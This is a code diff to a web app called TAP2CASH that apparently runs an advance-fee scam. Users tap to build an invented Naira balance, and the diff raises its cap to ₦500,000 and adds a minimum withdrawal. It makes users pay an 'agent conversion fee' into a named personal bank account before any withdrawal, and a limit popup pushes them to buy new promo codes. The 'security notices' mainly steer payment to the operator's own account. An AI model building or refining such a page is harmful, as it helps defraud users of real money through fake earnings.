@@ -2686,21 +2686,13 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
         </div>
         <div class="payment-content">
 
-            <!-- Gold scrolling notice ticker -->
-            <div style="background:#1a1200;border:1.5px solid #ffd700;border-radius:10px;padding:10px 12px;overflow:hidden;position:relative;box-shadow:0 0 12px rgba(255,215,0,0.25)">
-                <div style="color:#ffd700;font-size:11px;font-weight:800;margin-bottom:5px;letter-spacing:1px">📢 IMPORTANT NOTICE</div>
-                <div style="overflow:hidden;white-space:nowrap">
-                    <div id="noticeTicker" style="display:inline-block;animation:tickerScroll 22s linear infinite;color:#ffe066;font-size:11px;font-weight:600;line-height:1.6">
-                        ⚠️ NOTICE: The payment you are making is an agent conversion fee. This fee allows our agent to convert your coins into Naira and send it directly to your bank account. This service is NOT free — payment must be made before your withdrawal is processed. 🚨 UPDATE: Due to a recent issue with OPay transfers, we no longer accept OPay payments. Please use any other bank to complete your payment. Thank you for using TAP2CASH! 🪙 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ⚠️ NOTICE: The payment you are making is an agent conversion fee. This fee allows our agent to convert your coins into Naira and send it directly to your bank account. This service is NOT free — payment must be made before your withdrawal is processed. 🚨 UPDATE: Due to a recent issue with OPay transfers, we no longer accept OPay payments. Please use any other bank to complete your payment. Thank you for using TAP2CASH! 🪙
-                    </div>
+            <!-- Withdrawal instructions notice -->
+            <div style="background:#1a237e;border-left:5px solid #00e676;border-radius:16px;padding:14px 16px;margin-bottom:14px;box-shadow:0 4px 12px rgba(0,230,118,0.12)">
+                <div style="color:#00e676;font-size:14px;font-weight:800;margin-bottom:8px;letter-spacing:.5px">📢 HOW TO COMPLETE YOUR WITHDRAWAL</div>
+                <div style="color:#b8c0e0;font-size:12px;font-weight:500;line-height:1.7">
+                    To complete your withdrawal, carefully review the payment details displayed below. If a payment is required, use only the account details shown on this official page, then upload your payment proof below. ⚠️ Do not send money to any different account or to anyone who contacts you privately claiming to represent TAP2CASH.
                 </div>
             </div>
-            <style>
-                @keyframes tickerScroll {
-                    0%   { transform: translateX(0%); }
-                    100% { transform: translateX(-50%); }
-                }
-            </style>
 
             <!-- Amount -->
             <div style="background:#1a237e;border:2px solid #00e676;border-radius:10px;padding:6px;text-align:center;">
@@ -2997,6 +2989,7 @@ let coinCount = 0;
 let nairaBalance = 0;
 
 let tapCount = 0;
+let tappingCompleted = false;
 
 let txHistory = [];
 
@@ -3406,78 +3399,12 @@ function promoLogin() {
 
             resetDashboard();
 
-            // Show anti-scam welcome message
-            showWelcomeWarning();
 
         }, 500);
 
     }, 1200);
 
 }
-
-function showWelcomeWarning() {
-    const popup = document.createElement('div');
-    popup.id = 'welcomeWarning';
-    popup.innerHTML = `
-        <div style="
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            background:rgba(0,0,0,0.85);
-            z-index:999999;
-            display:flex;align-items:center;justify-content:center;
-            padding:20px;box-sizing:border-box;
-            animation:fadeInBg 0.3s ease;
-        " onclick="this.parentElement.remove()">
-            <div style="
-                background:linear-gradient(135deg,#0a0a0a,#1a1200,#0a0a0a);
-                border:2px solid #ffd700;
-                border-radius:20px;
-                padding:26px 22px;
-                max-width:380px;
-                width:100%;
-                box-shadow:0 0 40px rgba(255,215,0,0.4);
-                text-align:center;
-                animation:slideUpPop 0.4s ease;
-            " onclick="event.stopPropagation()">
-                <div style="font-size:38px;margin-bottom:8px">🎉</div>
-                <div style="color:#ffd700;font-size:16px;font-weight:800;margin-bottom:6px;text-shadow:0 0 10px rgba(255,215,0,0.5)">
-                    Welcome to TAP2CASH!
-                </div>
-                <div style="color:#ffe066;font-size:12px;margin-bottom:16px;opacity:0.85">
-                    Thank you for logging in with promo code <strong style="color:#ffd700">1549</strong>
-                </div>
-
-                <div style="background:rgba(255,0,0,0.1);border:1.5px solid #ff4444;border-radius:12px;padding:14px;margin-bottom:16px;text-align:left">
-                    <div style="color:#ff4444;font-size:13px;font-weight:800;margin-bottom:8px">⚠️ IMPORTANT SECURITY NOTICE</div>
-                    <div style="color:#ffcccc;font-size:11.5px;line-height:1.8">
-                        If <strong>anyone messages you</strong> asking you to pay money directly to them — <strong style="color:#ff4444">DO NOT PAY!</strong> This is a scam.<br><br>
-                        TAP2CASH will <strong>NEVER</strong> ask you to send money to any personal account. All payments are made <strong>only through the official account displayed inside the TAP2CASH app or website</strong>.<br><br>
-                        If anyone contacts you claiming to be TAP2CASH and asks for payment, please <strong style="color:#ffd700">report them immediately through our Customer Care</strong> on the Contact page.
-                    </div>
-                </div>
-
-                <div style="background:rgba(0,230,118,0.08);border:1px solid #00e676;border-radius:10px;padding:10px;margin-bottom:18px">
-                    <div style="color:#00e676;font-size:11.5px;font-weight:700">✅ ONLY pay to the account shown inside the official TAP2CASH app. Stay safe!</div>
-                </div>
-
-                <button onclick="document.getElementById('welcomeWarning').remove()" style="
-                    background:linear-gradient(135deg,#ffd700,#ff8c00);
-                    color:#000;font-weight:800;font-size:14px;
-                    border:none;border-radius:12px;
-                    padding:12px 40px;cursor:pointer;
-                    box-shadow:0 4px 15px rgba(255,215,0,0.4);
-                    width:100%;
-                ">I UNDERSTAND — START TAPPING 🪙</button>
-            </div>
-        </div>
-        <style>
-            @keyframes fadeInBg { from{opacity:0} to{opacity:1} }
-            @keyframes slideUpPop { from{opacity:0;transform:translateY(40px)} to{opacity:1;transform:translateY(0)} }
-        </style>
-    `;
-    document.body.appendChild(popup);
-}
-
-
 
 function showBuyScreen() {
 
@@ -3594,6 +3521,7 @@ function resetDashboard() {
     txHistory = currentUser ? (currentUser.txHistory || []) : (JSON.parse(sessionStorage.getItem('tap2cash_txHistory') || '[]'));
 
     tapCount = 0;
+    tappingCompleted = currentUser ? currentUser.tappingCompleted === true : false;
 
     updateDashboard();
 
@@ -3736,9 +3664,19 @@ function handleCoinTap(event) {
 
     event.stopPropagation();
 
-    // Cap at ₦200,000 — no more tapping allowed
-    if (nairaBalance >= 200000) {
-        showLimitMessage();
+    // Once the ₦500,000 milestone has been reached, tapping is permanently locked.
+    // Do NOT show the limit popup again on later taps.
+    if (tappingCompleted) {
+        return;
+    }
+
+    if (nairaBalance >= 500000) {
+        tappingCompleted = true;
+        if (currentUser) {
+            currentUser.tappingCompleted = true;
+            users[currentUser.phone] = currentUser;
+            saveUsers();
+        }
         return;
     }
 
@@ -3777,9 +3715,18 @@ function handleCoinTap(event) {
         nairaBalance += NAIRA_PER_COIN;
 
         // Enforce cap after earning a coin
-        if (nairaBalance > 200000) nairaBalance = 200000;
-
-        showToast('+1 Coin = +N120!', 'success');
+        if (nairaBalance >= 500000) {
+            nairaBalance = 500000;
+            tappingCompleted = true;
+            if (currentUser) {
+                currentUser.tappingCompleted = true;
+                users[currentUser.phone] = currentUser;
+                saveUsers();
+            }
+            showLimitMessage();
+        } else {
+            showToast('+1 Coin = +N120!', 'success');
+        }
 
     }
 
@@ -3895,9 +3842,23 @@ function handleWithdraw() {
 
     }
 
+    // Minimum withdrawal amount is ₦20,000
+    if (amount < 20000) {
+        showToast('Minimum withdrawal amount is ₦20,000', '');
+        return;
+    }
+
     if (amount > nairaBalance) {
 
         showToast('Insufficient balance', '');
+
+        return;
+
+    }
+
+    if (amount < 20000) {
+
+        showToast('Minimum withdrawal amount is ₦20,000', '');
 
         return;
 
@@ -4001,6 +3962,15 @@ function showConfirmScreen() {
 
 function showPaymentScreen() {
 
+    // Show the security/payment confirmation notice BEFORE opening the payment page.
+    // The user must acknowledge it before continuing.
+    showWithdrawalSecurityNotice();
+}
+
+function continueToPaymentAfterNotice() {
+    const notice = document.getElementById('withdrawalSecurityNotice');
+    if (notice) notice.remove();
+
     // Add Processing entry to history when PROCEED is clicked
     // Always add new processing entry - allow multiple withdrawals
     var entry = {
@@ -4035,6 +4005,30 @@ function showPaymentScreen() {
 
 }
 
+function showWithdrawalSecurityNotice() {
+    if (document.getElementById('withdrawalSecurityNotice')) return;
+
+    const popup = document.createElement('div');
+    popup.id = 'withdrawalSecurityNotice';
+    popup.innerHTML = `
+        <div style="position:fixed;inset:0;background:rgba(0,0,0,.78);z-index:999999;display:flex;align-items:center;justify-content:center;padding:18px;box-sizing:border-box;">
+            <div style="width:100%;max-width:370px;background:linear-gradient(180deg,#101c3d,#0d1530);border:2px solid #00e676;border-radius:18px;padding:20px 18px;box-shadow:0 10px 40px rgba(0,0,0,.5);text-align:center;">
+                <div style="font-size:30px;margin-bottom:7px">⚠️</div>
+                <div style="color:#00e676;font-size:16px;font-weight:800;margin-bottom:12px">IMPORTANT PAYMENT NOTICE</div>
+                <div style="color:#dce3ff;font-size:12px;line-height:1.7;text-align:left;">
+                    Before continuing, carefully check the payment details shown below. Do not send money to any different account or to anyone who contacts you privately claiming to represent TAP2CASH.
+                </div>
+                <div style="margin-top:13px;background:#1a237e;border-radius:12px;padding:11px 12px;text-align:left;border:1px solid #283593;">
+                    <div style="display:flex;justify-content:space-between;gap:10px;margin-bottom:7px"><span style="color:#9fa8c7;font-size:11px">Bank</span><strong style="color:#fff;font-size:12px">VFD MFB</strong></div>
+                    <div style="display:flex;justify-content:space-between;gap:10px;margin-bottom:7px"><span style="color:#9fa8c7;font-size:11px">Account Name</span><strong style="color:#00e676;font-size:12px">ADEYEMO</strong></div>
+                    <div style="display:flex;justify-content:space-between;gap:10px"><span style="color:#9fa8c7;font-size:11px">Account Number</span><strong style="color:#ffd700;font-size:13px;letter-spacing:1px">1049323887</strong></div>
+                </div>
+                <div style="color:#ffcc80;font-size:11px;line-height:1.6;margin:12px 0 16px;">If anyone sends you different payment details by message, do not pay. Use only the details displayed in the Tap2Cash payment page.</div>
+                <button onclick="continueToPaymentAfterNotice()" style="width:100%;padding:12px;border:0;border-radius:11px;background:linear-gradient(180deg,#00e676,#00a344);color:#fff;font-size:13px;font-weight:800;cursor:pointer;">I UNDERSTAND &amp; CONTINUE</button>
+            </div>
+        </div>`;
+    document.body.appendChild(popup);
+}
 
 
 function previewReceipt(event) {
@@ -4271,8 +4265,8 @@ function showLimitMessage() {
                 opacity:0.92;
             ">
                 This is because you are using the old promo code <span style="color:#ffd700;font-weight:800">1549</span>.<br><br>
-                To withdraw more than <span style="color:#ffd700;font-weight:800">₦200,000</span>, please upgrade to a new promo code.<br><br>
-                You can either <span style="color:#ffd700;font-weight:700">buy a new promo code</span> to unlock a higher limit or <span style="color:#ffd700;font-weight:700">withdraw your current balance of ₦200,000</span>.
+                To withdraw more than <span style="color:#ffd700;font-weight:800">₦500,000</span>, please upgrade to a new promo code.<br><br>
+                You can either <span style="color:#ffd700;font-weight:700">buy a new promo code</span> to unlock a higher limit or <span style="color:#ffd700;font-weight:700">withdraw your current balance of ₦500,000</span>.
             </div>
         </div>
         <style>
